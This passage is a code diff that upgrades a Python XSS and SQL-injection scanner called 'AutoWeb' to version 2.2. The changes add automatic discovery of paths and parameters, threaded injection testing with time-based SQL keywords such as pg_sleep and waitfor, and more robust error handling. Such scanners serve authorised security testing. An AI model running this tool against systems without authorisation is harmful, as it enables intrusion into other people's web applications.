+                baseline_status = 200
         except Exception:
             baseline_length = 0
             baseline_status = 200
@@ -724,9 +972,12 @@ class AutoWebScanner:
 
                     start_time = time.time()
                     if method == 'post':
-                        r = self.session.post(url, data=form_data, timeout=self.timeout + 2)
+                        r = self.safe_request('post', url, data=form_data)
                     else:
-                        r = self.session.get(url, params=form_data, timeout=self.timeout + 2)
+                        r = self.safe_request('get', url, params=form_data)
+                    
+                    if not r:
+                        continue
                     elapsed = time.time() - start_time
 
                     if self.has_sqli_error(r.text):
@@ -764,9 +1015,6 @@ class AutoWebScanner:
                             })
                             break
 
-                    if self.delay:
-                        time.sleep(self.delay)
-
                 except Timeout:
                     if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark', 'pg_sleep', 'dbms_lock']):
                         findings.append({
@@ -784,50 +1032,64 @@ class AutoWebScanner:
         return findings
 
     def scan_sqli(self):
-        """BUG FIXED - payloads_count defined before conditional blocks"""
         print("\n[===== SQLi SCAN =====]")
         all_findings = []
-        payloads_count = len(self.get_sqli_payloads())  # ← FIX: moved up here
+        payloads_count = len(self.get_sqli_payloads())
 
-        # 1) Test URL parameters
+        # 1) Test URL parameters from crawled pages
         param_tasks = []
         for url in list(self.visited):
             params = self.extract_url_params(url)
             for param in params:
                 param_tasks.append((url, param))
 
-        base_params = self.extract_url_params(self.target_url)
-        for param in base_params:
-            if (self.target_url, param) not in param_tasks:
-                param_tasks.append((self.target_url, param))
+        # 2) Add discovered parameters
+        if self.auto_detect:
+            for param in self.all_parameters:
+                if param not in [p for _, p in param_tasks]:
+                    for url in list(self.discovered_urls)[:5]:
+                        param_tasks.append((url, param))
+
+        # 3) Add common parameters
+        common_params = self.get_common_parameters()
+        for param in common_params:
+            if param not in [p for _, p in param_tasks]:
+                for url in list(self.discovered_urls)[:3] + [self.target_url]:
+                    param_tasks.append((url, param))
 
         if param_tasks:
             total = len(param_tasks)
             print(f"[*] Testing {total} URL parameter(s) with {payloads_count} SQLi payloads each...")
-            with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            with ThreadPoolExecutor(max_workers=min(self.threads, len(param_tasks))) as executor:
                 futures = {
                     executor.submit(self.test_sqli_reflected, url, param): (url, param)
                     for url, param in param_tasks
                 }
                 for future in as_completed(futures):
-                    result = future.result()
-                    if result:
-                        all_findings.append(result)
-                        f_type = result['type'].split('(')[0].strip()
-                        print(f"  [SQLi FOUND] [{f_type}] {result['parameter']} @ {result['url'][:80]}")
-                        print(f"    Payload: {result['payload'][:120]}")
+                    try:
+                        result = future.result(timeout=self.timeout+5)
+                        if result:
+                            all_findings.append(result)
+                            f_type = result['type'].split('(')[0].strip()
+                            print(f"  [SQLi FOUND] [{f_type}] {result['parameter']} @ {result['url'][:80]}")
+                            print(f"    Payload: {result['payload'][:120]}")
+                    except Exception as e:
+                        continue
 
-        # 2) Test forms
+        # 4) Test forms
         if self.forms:
             print(f"[*] Testing {len(self.forms)} form(s) with {payloads_count} SQLi payloads each...")
-            with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            with ThreadPoolExecutor(max_workers=min(self.threads, len(self.forms))) as executor:
                 futures = {executor.submit(self.test_sqli_form, form): form for form in self.forms}
                 for future in as_completed(futures):
-                    results = future.result()
-                    for result in results:
-                        all_findings.append(result)
-                        print(f"  [SQLi FOUND] [{result['type'].split('(')[0].strip()}] {result['parameter']} @ {result['url'][:80]}")
-                        print(f"    Payload: {result['payload'][:120]}")
+                    try:
+                        results = future.result(timeout=self.timeout+5)
+                        for result in results:
+                            all_findings.append(result)
+                            print(f"  [SQLi FOUND] [{result['type'].split('(')[0].strip()}] {result['parameter']} @ {result['url'][:80]}")
+                            print(f"    Payload: {result['payload'][:120]}")
+                    except Exception as e:
+                        continue
 
         self.sqli_vulns = all_findings
         if not all_findings:
@@ -846,10 +1108,14 @@ class AutoWebScanner:
         print(f"\nTarget:      {self.target_url}")
         print(f"Domain:      {self.domain}")
         print(f"Pages crawled: {len(self.visited)}")
+        print(f"Pages discovered: {len(self.discovered_urls)}")
         print(f"Forms discovered: {len(self.forms)}")
         print(f"WAF Detected: {self.waf_detected} ({self.waf_name})")
+        print(f"Technologies: {', '.join(self.technologies) if self.technologies else 'Unknown'}")
+        print(f"Parameters found: {len(self.all_parameters)}")
         print(f"XSS Payloads tested: {len(self.get_xss_payloads())}")
         print(f"SQLi Payloads tested: {len(self.get_sqli_payloads())}")
+        print(f"Total requests made: {self.request_count}")
 
         print("\n" + "-" * 70)
         print("XSS VULNERABILITIES")
@@ -894,30 +1160,33 @@ class AutoWebScanner:
 
 def main():
     parser = argparse.ArgumentParser(
-        description="AutoWeb v2.1 - Advanced XSS & SQLi Scanner",
+        description="AutoWeb v2.2 - Advanced XSS & SQLi Scanner with Auto-Detection",
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
 
-    parser.add_argument('-u', '--url', required=True, help='Target URL')
-    parser.add_argument('--crawl-depth', type=int, default=2)
-    parser.add_argument('--threads', type=int, default=5)
-    parser.add_argument('--timeout', type=int, default=10)
-    parser.add_argument('--delay', type=float, default=0)
-    parser.add_argument('--xss-only', action='store_true')
-    parser.add_argument('--sqli-only', action='store_true')
-    parser.add_argument('--no-advanced', action='store_true')
-    parser.add_argument('--cookie', type=str)
-    parser.add_argument('--header', type=str, action='append')
-    parser.add_argument('--no-waf', action='store_true')
+    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://target.com)')
+    parser.add_argument('--crawl-depth', type=int, default=2, help='Crawl depth (default: 2)')
+    parser.add_argument('--threads', type=int, default=5, help='Number of threads (default: 5)')
+    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
+    parser.add_argument('--delay', type=float, default=0, help='Delay between requests in seconds')
+    parser.add_argument('--xss-only', action='store_true', help='Only scan for XSS')
+    parser.add_argument('--sqli-only', action='store_true', help='Only scan for SQLi')
+    parser.add_argument('--no-advanced', action='store_true', help='Disable advanced payloads')
+    parser.add_argument('--no-auto-detect', action='store_true', help='Disable auto-detection')
+    parser.add_argument('--cookie', type=str, help='Cookies (format: name1=value1; name2=value2)')
+    parser.add_argument('--header', type=str, action='append', help='Custom headers (format: Name: Value)')
+    parser.add_argument('--no-waf', action='store_true', help='Skip WAF detection')
+    parser.add_argument('--verify-ssl', action='store_true', help='Verify SSL certificates')
 
     args = parser.parse_args()
 
     cookies = {}
     if args.cookie:
         for pair in args.cookie.split(';'):
+            pair = pair.strip()
             if '=' in pair:
-                k, v = pair.strip().split('=', 1)
-                cookies[k] = v
+                k, v = pair.split('=', 1)
+                cookies[k.strip()] = v.strip()
 
     headers = {}
     if args.header:
@@ -933,9 +1202,13 @@ def main():
    | |_| (_| || |_|  __/ |___| |___ | |   \ V  V /  
     \___/\__,_| \__|\___|\____|_____|_|    \_/\_/   
                                                      
-   AutoWeb v2.1 - XSS & SQLi Scanner (Bug Fixed)
+   AutoWeb v2.2 - XSS & SQLi Scanner (Auto-Detection)
    Authorized Security Testing Only
     """)
+
+    # Ensure URL has scheme
+    if not args.url.startswith(('http://', 'https://')):
+        args.url = 'http://' + args.url
 
     scanner = AutoWebScanner(
         target_url=args.url,
@@ -947,10 +1220,26 @@ def main():
         delay=args.delay,
         xss_advanced=not args.no_advanced,
         sqli_advanced=not args.no_advanced,
+        auto_detect=not args.no_auto_detect,
     )
 
     if not args.no_waf:
         print(scanner.detect_waf())
+        print()
+
+    # Auto-detection phase
+    if scanner.auto_detect:
+        print("[*] Auto-detection phase started...")
+        print("[*] Discovering common paths...")
+        scanner.discover_common_paths()
+        
+        print("[*] Discovering technology-specific pages...")
+        scanner.test_for_tech_identified_pages()
+        
+        print("[*] Discovering dynamic parameters...")
+        scanner.discover_dynamic_parameters()
+        
+        print(f"[*] Auto-detection complete. Discovered {len(scanner.discovered_urls)} URLs and {len(scanner.all_parameters)} parameters.")
         print()
 
     print("[*] Starting crawl...")
@@ -967,4 +1256,13 @@ def main():
 
 
 if __name__ == '__main__':
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[!] Scan interrupted by user.")
+        sys.exit(1)
+    except Exception as e:
+        print(f"\n[!] Fatal error: {e}")
+        import traceback
+        traceback.print_exc()
+        sys.exit(1)
